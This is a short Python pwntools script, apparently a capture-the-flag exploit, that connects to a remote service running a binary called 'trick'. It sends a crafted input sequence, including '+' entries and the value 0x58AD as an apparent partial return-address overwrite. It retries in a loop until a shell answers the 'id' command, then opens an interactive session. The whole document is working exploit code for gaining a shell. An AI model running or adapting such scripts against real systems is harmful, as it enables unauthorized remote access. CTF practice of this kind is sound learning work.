from cmath import exp
from pwn import *

while True:
    try:
        p = remote("realsung.kr", 13347)
        # p = process("./trick")
        e = ELF("./trick")
        context.log_level = 'debug'

        p.sendlineafter(b'hi?\n', str(23))

        for _ in range(18):
            p.sendlineafter(b'gogo\n', str(1))

        for _ in range(2):
            p.sendlineafter(b'gogo\n', b'+')

        for _ in range(2):
            p.sendlineafter(b'gogo\n', str(1))

        p.sendlineafter(b'gogo\n', str(int(0x58AD)))

        p.sendline(b"id")
        if p.recvline() in '1000':
            p.interactive()
        else:
            p.close()
    except:
        pass

p.interactive()